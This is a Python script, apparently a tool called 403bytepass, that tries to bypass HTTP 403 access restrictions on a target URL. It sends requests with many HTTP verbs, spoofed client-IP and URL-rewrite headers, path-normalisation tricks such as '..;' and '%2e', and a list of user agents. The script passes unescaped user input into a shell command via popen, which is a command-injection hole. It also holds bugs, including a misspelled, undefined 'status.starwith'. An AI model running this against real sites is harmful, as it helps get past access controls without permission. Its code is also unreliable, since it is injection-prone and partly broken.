import sys
import time
from os import popen


class bcolors:
        OK = '\033[92m'
        INFO = '\033[94m'
        WARNING = '\033[93m'
        FAIL = '\033[91m'
        RESET = '\033[0m'

def banner():
	print(bcolors.WARNING+'''
  ____  ___   ____  ___         __                          
 / / / / _ \ |_  / / _ ) __ __ / /_ ___  ___  ___ _ ___  ___
/_  _// // /_/_ < / _  |/ // // __// -_)/ _ \/ _ `/(_-< (_-<
 /_/  \___//____//____/ \_, / \__/ \__// .__/\_,_//___//___/
                       /___/          /_/                   
               .--.
              |.-. '----------.
              |'-' .--"--""--"/
               '--'
	'''+bcolors.RESET)


def curl_fct(options,test):
	command = popen("curl -k -s -I %s %s | grep HTTP | tail -1" % (options, test)).read()  #Commande par défaut
	# -k = connexion sans la sécurité SSL acceptée
	# -s = mode muet (curl n'affiche rien d'autre que la réponse)
	# -I = Affiche seulement le header

	try:
		code = command.strip().split(" ")[1]  #Récupere le code de status
	except:
		print(bcolors.FAIL+"[!]"+bcolors.RESET+"No status code")  #Si aucun code n'est trouvé on affiche un code d'erreur
		return

	if code == "200":  #Si le code est un code 200
		command = bcolors.OK+command+bcolors.RESET #On affiche la réponse en vert

	elif code.startswith("30"):  #Si le code est un code 30X
		command = bcolors.WARNING+command+bcolors.RESET  #On affiche la réponse en orange
	
	elif code.startswith("40") or status.starwith("50"):  #Si le code est un code 40X ou 50X
		command = bcolors.FAIL+command+bcolors.RESET  #On affiche la réponse en rouge
	return command

def main():

	try:
		if len(sys.argv)>2: #Si on utilise trop d'arguments
			print(bcolors.INFO+"[*]"+bcolors.RESET+"Usage: python3 403bytepass.py <target>") #On affiche un message d'utilisation
			sys.exit(1)  #On sort du script
		elif len(sys.argv) == 1:  #Si on n'utilise pas d'arument
			print(bcolors.INFO+"[*]"+bcolors.RESET+"Usage: python3 403bytepass.py <target>") #On affiche un message d'utilisation
			sys.exit(1) #On sort du script
			
		target = sys.argv[1] #La cible correspond à l'argument
	except Exception as e:  #Si il y a une erreur
		sys.exit(1) #On sort du script
	
	if not target.startswith("http"):  #On vérifie si l'url de la cible commence bien par http ou https
		print(bcolors.FAIL+"[!]"+bcolors.RESET+"URL must start with http:// or https://")  #On affiche un message d'erreur et un message d'utilisation
		print(bcolors.INFO+"[*]"+bcolors.RESET+"Usage: python3 403bytepass.py <target>")
		sys.exit(1)

	SlashCheck = target.count("/")  #On vérifie le nombre de slash utilisé dans l'url
	if target.endswith("/"):  #Si l'url fini par un slash
		SlashCheck = SlashCheck-1 #On enleve un slash au compteur pour la suite
		print("Target selected: "+target)

	else:  #Sinon
		print(target+"/") #On ajoute le slash qui manque

	if SlashCheck == 2:  #Si on a bien 2 slash dans l'url correspondant au http://
		uri = ""
	else:  #Sinon, gestion de l'uri
		aux = target.split("/")
		target = "/".join(aux[:SlashCheck])
		uri = aux[SlashCheck]
	try:
		start=time.time() #début du chronomètre à un temps t=0s
		print("\n")
		print(bcolors.OK+"[+]"+bcolors.RESET+"Trying bypass with"+bcolors.OK+" VERB TAMPERING"+bcolors.RESET)
		print("\n")
		test = target+"/"+uri
		##################Début des test (VERB TAMPERNG)########################
		print("Response for GET HTTP Method: ",curl_fct("-X GET",test))
		print("Response for COPY HTTP Method: ",curl_fct("-X COPY",test))
		print("Response for OPTIONS HTTP Method: ",curl_fct(" -X OPTIONS",test))
		print("Response for PUT HTTP Method: ",curl_fct(" -X PUT",test))
		print("Response for TRACE HTTP Method: ",curl_fct(" -X TRACE",test))
		print("Response for POST HTTP Method: ",curl_fct(" -X POST",test))
		print("Response for SEARCH HTTP Method: ",curl_fct(" -X SEARCH",test))
		print("Response for MOVE HTTP Method: ",curl_fct(" -X MOVE",test))
		print("Response for PATCH HTTP Method: ",curl_fct(" -X PATCH",test))
		print("Response for ACL HTTP Method: ",curl_fct("-X ACL",test))
		print("Response for ARBITRARY HTTP Method: ",curl_fct("-X ARBITRARY",test))
		print("Respondse for BASELINE-CONTROL HTTP Method: ",curl_fct("-X BASELINE-CONTROL",test))
		print("Response for CHECKIN HTTP Method: ",curl_fct("-X CHECKIN",test))
		print("Response for CHECKOUT HTTP Method: ",curl_fct("-X CHECKOUT",test))
		print("Response for CONNECT HTTP Method: ",curl_fct("-X CONNECT",test))
		print("Response for HEAD HTTP Method: ",curl_fct(" -X HEAD -m 1",test))
		print("Response for LABEL HTTP Method: ",curl_fct(" -X LABEL",test))
		print("Response for LOCK HTTP Method: ",curl_fct(" -X LOCK",test))
		print("Response for MERGE HTTP Method: ",curl_fct(" -X MERGE",test))
		print("Response for MKACTIVITY HTTP Method: ",curl_fct(" -X MKACTIVITY",test))
		print("Response for MKCOL HTTP Method: ",curl_fct(" -X MKCOL",test))
		print("Response for MKWORKSPACE HTTP Method: ",curl_fct(" -X MKWORKSPACE",test))
		print("Response for ORDERPATCH HTTP Method: ",curl_fct(" -X ORDERPATCH",test))
		print("Response for PROPFIND HTTTP Method: ",curl_fct(" -X PROPFIND",test))
		print("Response for PROPPATCH HTTP Method: ",curl_fct(" -X PROPPATCH",test))
		print("Response for REPORT HTTP Method: ",curl_fct(" -X REPORT",test))
		print("Response for UNCHECKOUT HTTP Method: ",curl_fct(" -X UNCHECKOUT",test))
		print("Response for UNLOCK HTTP Method: ",curl_fct(" -X UNLOCK",test))
		print("Response for UPDATE HTTP Method: ",curl_fct(" -X UPDATE",test))
		print("Response for VERSION-CONTROL HTTP Method: ",curl_fct(" -X VERSION-CONTROL",test))
		print("\n")
		####################Fin des tests (VERB TAMPERING)#######################
		
		
		####################Fin des tests (HEADER)###############################
		print(bcolors.OK+"[+]"+bcolors.RESET+"Try bypass with"+bcolors.OK+" HEADER"+bcolors.RESET)
		print("\n")
		print("HEADER -> Referer : ",curl_fct(" -X GET -H \"Referer: "+test+"\"",test))
		print("HEADER -> X-Custom-IP-Authorization: ",curl_fct(" -X GET -H \"X-Custom-IP-Authorization: 127.0.0.1\"",test))
		test=target+"/"+uri+"..\;"
		print("HEADER -> X-Custom-IP-Authorization: ..;: ",curl_fct(" -X GET -H \"X-Custom-IP-Authorization: 127.0.0.1\"",test))
		test=target+"/"
		print("HEADER -> X-Original-URL: ",curl_fct(" -X GET -H \"X-Original-URL: /"+uri+"\"",test))
		print("HEADER -> X-Rewrite-URL: ",curl_fct(" -X GET -H \"X-Rewrite-URL: /"+uri+"\"",test))
		test=target+"/"+uri
		print("HEADER -> X-Originating-IP: ",curl_fct(" -X GET -H \"X-Originating-IP: 127.0.0.1\"",test))
		print("HEADER -> X-Forwarded-For: ",curl_fct(" -X GET -H \"X-Forwarded-For: 127.0.0.1\"",test))
		print("HEADER -> X-Remote-IP: ",curl_fct(" -X GET -H \"X-Remote-IP: 127.0.0.1\"",test))
		print("HEADER -> X-Client-IP: ",curl_fct(" -X GET -H \"X-Client-IP: 127.0.0.1\"",test))
		print("HEADER -> X-Host: ",curl_fct(" -X GET -H \"X-Host: 127.0.0.1\"",test))
		print("HEADER -> X-Forwarded-Host: ",curl_fct(" -X GET -H \"X-Forwarded-Host: 127.0.0.1\"",test))
		print("\n")
		####################Fin des tests (HEADER)###############################
		
		####################Début des tests (Tips)###############################
		print(bcolors.OK+"[+]"+bcolors.RESET+"Try bypass with"+bcolors.OK+" Bug Bounty Tricks"+bcolors.RESET)
		print("\n")
		test=target+"/%2e/"+uri
		print("Response with /%2e/ between: ",curl_fct(" -X GET",test))
		test=target+"/"+uri+"/."
		print("Response ending with /. : ",curl_fct(" -X GET --path-as-is",test))
		print("Response ending with ?: ",curl_fct(" -X GET",test))
		test=target+"/"+uri+"??"
		print("Response ending with ??: ",curl_fct(" -X GET",test))
		test=target+"/"+uri+"//"
		print("Response ending with //: ",curl_fct(" -X GET",test))
		test=target+"/./"+uri+"/./"
		print("Response beween and ending with /./ : ",curl_fct(" -X GET --path-as-is",test))
		test=target+"/"+uri+"/"
		print("Response ending with /: ",curl_fct(" -X GET",test))
		test=target+"/"+uri+"/.string"
		print("Response ending with .string: ",curl_fct(" -X GET",test))
		test=target+"/"+uri+"..\;/"
		print("Response ending with ..; : ",curl_fct(" -X GET --path-as-is",test))
		test=target+"/.\;/"+uri
		print("Response with /.;/ between: ",curl_fct(" -X GET --path-as-is",test))
		test=target+"\;foo=bar/"+uri
		print("Response  with ;foo=bar;/ between: ",curl_fct(" -X GET --path-as-is",test))
		test=target+"/%20"+uri+"%20/"
		print("Response with %20 between: ",curl_fct(" -X GET --path-as-is",test))
		test=target+uri+"%20/"
		print("Response ending with %20/:",curl_fct(" -X GET",test))
		stop=time.time()
		Time=stop-start #Arret du chronomètre
		print("\n")
		####################Fin des tests (Tips)###############################
		
		####################Début des tests (User Agent)#######################
		print(bcolors.OK+"[+]"+bcolors.RESET+"Try bypass with"+bcolors.OK+" Custom User Agent"+bcolors.RESET)
		test=target+"/"+uri

		with open("UserAgents.txt") as f:
			for payload in f:
				paystrip=payload.strip()
				print(paystrip+": "+curl_fct(" -X GET -H \"User-Agent: "+paystrip+"\"",test))
		####################Fin des tests (User Agent)#########################

		print(bcolors.OK+"[+]"+bcolors.RESET+"Tests finished")  #Fin des tests
		print(bcolors.OK+"[+]"+bcolors.RESET+"Testing time:", Time)  #Affichage du temps de tests

	except Exception as e:  #Si il y a une erreur
		print(bcolors.FAIL+"[!]"+bcolors.RESET+"An error occured")  #On affiche un message d'erreur
		print(e)  # On affiche l'erreur
	except KeyboardInterrupt:  #Si il y a une interruption clavier
		print(bcolors.FAIL+"[!]"+bcolors.RESET+"Key Interruption: Coming back home")  #On affiche un message d'interruption clavier

try:
	banner()  #affichage bannière
	main()  #lancement du script
except Exception as e:  #Si erreur
	print(e) #affichage erreur
